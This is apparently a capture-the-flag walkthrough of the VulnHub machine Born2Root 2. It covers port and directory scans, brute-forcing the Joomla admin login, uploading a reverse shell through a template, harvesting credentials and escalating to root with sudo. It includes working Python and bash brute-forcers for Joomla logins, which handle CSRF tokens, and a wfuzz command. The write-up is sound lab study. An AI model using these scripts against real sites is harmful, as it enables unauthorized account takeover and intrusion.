# Description

- https://www.vulnhub.com/entry/born2root-2,291/


# Keysword




# nmap

```bash

$ sudo nmap -sT -A -Pn -n -p- 192.168.110.7
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-14 09:40 CEST
Nmap scan report for 192.168.110.7
Host is up (0.0011s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 ec:61:97:9f:4d:cb:75:99:59:d4:c1:c4:d4:3e:d9:dc (DSA)
|   2048 89:99:c4:54:9a:18:66:f7:cd:8e:ab:b6:aa:31:2e:c6 (RSA)
|   256 60:be:dd:8f:1a:d7:a3:f3:fe:21:cc:2f:11:30:7b:0d (ECDSA)
|_  256 39:d9:79:26:60:3d:6c:a2:1e:8b:19:71:c0:e2:5e:5f (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Welcome to my website 
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          33499/tcp   status
|   100024  1          46887/udp6  status
|   100024  1          50957/udp   status
|_  100024  1          56187/tcp6  status
33499/tcp open  status  1 (RPC #100024)
MAC Address: 08:00:27:0A:1F:93 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   1.08 ms 192.168.110.7

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.08 seconds

```


# dirb

```bash

$ dirb http://192.168.110.7 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Apr 14 11:29:41 2021
URL_BASE: http://192.168.110.7/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.110.7/ ----
==> DIRECTORY: http://192.168.110.7/css/                                                 
==> DIRECTORY: http://192.168.110.7/img/                                                 
+ http://192.168.110.7/index.html (CODE:200|SIZE:8454)                                   
==> DIRECTORY: http://192.168.110.7/javascript/                                          
==> DIRECTORY: http://192.168.110.7/joomla/                                              
==> DIRECTORY: http://192.168.110.7/js/                                                  
+ http://192.168.110.7/LICENSE (CODE:200|SIZE:1093)                                      
==> DIRECTORY: http://192.168.110.7/manual/                                              
+ http://192.168.110.7/server-status (CODE:403|SIZE:302)                                 
==> DIRECTORY: http://192.168.110.7/vendor/                                              
                                                                                          
---- Entering directory: http://192.168.110.7/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                          
---- Entering directory: http://192.168.110.7/img/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                          
---- Entering directory: http://192.168.110.7/javascript/ ----
==> DIRECTORY: http://192.168.110.7/javascript/jquery/                                   
                                                                                          
---- Entering directory: http://192.168.110.7/joomla/ ----
==> DIRECTORY: http://192.168.110.7/joomla/administrator/                                
==> DIRECTORY: http://192.168.110.7/joomla/bin/                                          
==> DIRECTORY: http://192.168.110.7/joomla/cache/                                        
==> DIRECTORY: http://192.168.110.7/joomla/components/                                   
==> DIRECTORY: http://192.168.110.7/joomla/images/                                       
==> DIRECTORY: http://192.168.110.7/joomla/includes/                                     
+ http://192.168.110.7/joomla/index.php (CODE:200|SIZE:8504)                             
==> DIRECTORY: http://192.168.110.7/joomla/language/                                     
==> DIRECTORY: http://192.168.110.7/joomla/layouts/                                      
==> DIRECTORY: http://192.168.110.7/joomla/libraries/                                    
==> DIRECTORY: http://192.168.110.7/joomla/media/                                        
==> DIRECTORY: http://192.168.110.7/joomla/modules/                                      
==> DIRECTORY: http://192.168.110.7/joomla/plugins/                                      
==> DIRECTORY: http://192.168.110.7/joomla/templates/                                    
==> DIRECTORY: http://192.168.110.7/joomla/tmp/     

```

# Brute force `admin`

## Script

    http://192.168.110.7/joomla/administrator/
    admin : travel

## Upload reverse shell

Templates --> Template default for all pages --> New file --> Upload

http://192.168.110.7/joomla/templates/protostar/html/shell.php

### Joomla configure

```bash
public $dbtype = 'mysqli';
public $host = 'localhost';
public $user = 'joomla';
public $password = 'redhat';
public $db = 'joomla';
public $dbprefix = 'v3rlo_';
public $live_site = '';
public $secret = 'qognJLTotftnguG7';

```

# Get root

## Get `tim` access

```python

www-data@born2root:/opt/scripts$ cat fileshare.py
cat fileshare.py
#!/usr/bin/env python

import sys, paramiko

if len(sys.argv) < 5:
    print "args missing"
    sys.exit(1)

hostname = "localhost"
password = "lulzlol"
source = "/var/www/html/joomla"
dest = "/tmp/backup/joomla"

username = "tim"
port = 22

try:
    t = paramiko.Transport((hostname, port))
    t.connect(username=username, password=password)
    sftp = paramiko.SFTPClient.from_transport(t)
    sftp.get(source, dest)

finally:
    t.close()
```

## get root access

```bash
tim@born2root:~$ sudo -l
sudo -l
[sudo] password for tim: lulzlol

Matching Defaults entries for tim on born2root:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User tim may run the following commands on born2root:
    (ALL : ALL) ALL
tim@born2root:~$ 

tim@born2root:~$ sudo id
sudo id
uid=0(root) gid=0(root) groups=0(root)

```


# Script to brute force

## python

```py
#!/usr/bin/python3

import requests
from bs4 import BeautifulSoup
import argparse
from urllib.parse import urlparse

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class Joomla():

    def __init__(self):
        self.initializeVariables()
        self.sendrequest()

    def initializeVariables(self):
        #Initialize args
        parser = argparse.ArgumentParser(description='Joomla login bruteforce')
        #required
        parser.add_argument('-u', '--url', required=True, type=str, help='Joomla site')
        parser.add_argument('-w', '--wordlist', required=True, type=str, help='Path to wordlist file')

        #optional
        parser.add_argument('-p', '--proxy', type=str, help='Specify proxy. Optional. http://127.0.0.1:8080')
        parser.add_argument('-v', '--verbose', action='store_true', help='Shows output.')
        #these two arguments should not be together
        group = parser.add_mutually_exclusive_group(required=True)
        group.add_argument('-usr', '--username', type=str, help='One single username')
        group.add_argument('-U', '--userlist', type=str, help='Username list')

        args = parser.parse_args()

        #parse args and save proxy
        if args.proxy:
            parsedproxyurl = urlparse(args.proxy)
            self.proxy = { parsedproxyurl[0] : parsedproxyurl[1] }
        else:
            self.proxy=None

        #determine if verbose or not
        if args.verbose:
            self.verbose=True
        else:
            self.verbose=False

        #http:/site/administrator
        self.url = args.url+'/administrator/'
        self.ret = 'aW5kZXgucGhw'
        self.option='com_login'
        self.task='login'
        #Need cookie
        self.cookies = requests.session().get(self.url).cookies.get_dict()
        #Wordlist from args
        self.wordlistfile = args.wordlist
        self.username = args.username
        self.userlist = args.userlist

    def sendrequest(self):
        if self.userlist:
            for user in self.getdata(self.userlist):
                self.username=user.decode('utf-8')
                self.doGET()
        else:
            self.doGET()

    def doGET(self):
        for password in self.getdata(self.wordlistfile):
            #Custom user-agent :)
            headers = {
                'User-Agent': 'nano'
            }

            #First GET for CSSRF
            r = requests.get(self.url, proxies=self.proxy, cookies=self.cookies, headers=headers)
            soup = BeautifulSoup(r.text, 'html.parser')
            longstring = (soup.find_all('input', type='hidden')[-1]).get('name')
            password=password.decode('utf-8')

            data = {
                'username' : self.username,
                'passwd' : password,
                'option' : self.option,
                'task' : self.task,
                'return' : self.ret,
                longstring : 1
            }
            r = requests.post(self.url, data = data, proxies=self.proxy, cookies=self.cookies, headers=headers)
            soup = BeautifulSoup(r.text, 'html.parser')
            response = soup.find('div', {'class': 'alert-message'})
            if response:
                if self.verbose:
                    print(f'{bcolors.FAIL} {self.username}:{password}{bcolors.ENDC}')
            else:
                print(f'{bcolors.OKGREEN} {self.username}:{password}{bcolors.ENDC}')
                break

    @staticmethod
    def getdata(path):
        with open(path, 'rb+') as f:
            data = ([line.rstrip() for line in f])
            f.close()
        return data


joomla = Joomla()

```

## curl

```bash
#!/bin/bash

## Variables
URL="http://192.168.110.7/joomla/administrator"
USER_LIST="users.txt"
PASS_LIST="/home/kali/OSCP/Tools/SecLists/Passwords/Leaked-Databases/rockyou-75.txt"

## Value to look for in response (Whitelisting)
SUCCESS="Location: index.php"
FAILED="alert-message"

## Anti CSRF token

CSRF="$(curl -s -c cookie ${URL}/index.php | grep  '<input'  | awk -F 'name="' '{print $2}' | cut -d "\"" -f1 | tail -1 )"

## Counter
i=0

## Password loop
while read -r _PASS; do

  ## Username loop
  while read -r _USER; do

    ## Increase counter
    ((i=i+1))

    ## Feedback for user
    echo "[i] Try ${i}: ${_USER} // ${_PASS}"

    REQUEST="$( curl -s -L -b cookie --data "username=${_USER}&passwd=${_PASS}&options=com_login&task=login&${CSRF}=1" "${URL}/index.php" )"

    [[ $? -ne 0 ]] && echo -e '\n[!] Issue connecting! #2'
    # echo "${REQUEST}"

    ## Check response
      echo "${REQUEST}" | grep -q "${FAILED}"
      if [[ "$?" -eq 1 ]]; then
        ## Successed!
        echo -e "\n\n[i] Found!"
        echo "[i] Username: ${_USER}"
        echo "[i] Password: ${_PASS}"
        break 2
      fi

  done < ${USER_LIST}
done < ${PASS_LIST}

## Clean up
rm -f cookie

```


## wfuzz

```bash
$ curl -s -c cookie http://192.168.110.7/joomla/administrator/index.php | sed 's/^[ \t]*//g' | grep '<input'  && cat cookie                                                                            
<input name="username" tabindex="1" id="mod-login-username" type="text" class="input-medium" placeholder="Username" size="15" autofocus="true" />
<input name="passwd" tabindex="2" id="mod-login-password" type="password" class="input-medium" placeholder="Password" size="15"/>
<input type="hidden" name="option" value="com_login"/>
<input type="hidden" name="task" value="login"/>
<input type="hidden" name="return" value="aW5kZXgucGhw"/>
<input type="hidden" name="8948a6a8cfd68eefce2cb355d2ab8cc8" value="1" />  </fieldset>
# Netscape HTTP Cookie File
# https://curl.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.

#HttpOnly_192.168.110.7 FALSE   /       FALSE   0       56f3545bf8a6b2dff867d84c58f33803   kkovtc330nld5htn781vnqf255


$ wfuzz -t 1 -c -z file,users.txt -z file,passwds.txt -b 56f3545bf8a6b2dff867d84c58f33803=kkovtc330nld5htn781vnqf255 -L  -d "username=FUZZ&passwd=FUZ2Z&option=com_login&task=login&return=aW5kZXgucGhw&8948a6a8cfd68eefce2cb355d2ab8cc8=1" http://192.168.110.7/joomla/administrator/index.php 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.110.7/joomla/administrator/index.php
Total requests: 7

=====================================================================
ID           Response   Lines    Word       Chars       Payload                    
=====================================================================

000000001:   200        130 L    418 W      5614 Ch     "admin - travel3"          
000000003:   200        130 L    418 W      5614 Ch     "admin - travel1"          
000000005:   200        130 L    418 W      5614 Ch     "admin - admin"            
000000002:   200        130 L    418 W      5614 Ch     "admin - travel2"          
000000004:   200        495 L    1633 W     28583 Ch    "admin - travel"           
000000006:   200        0 L      20 W       121 Ch      "admin - password"         
000000007:   200        0 L      20 W       121 Ch      "admin - test"             

Total time: 0.401978
Processed Requests: 7
Filtered Requests: 0
Requests/sec.: 17.41386

```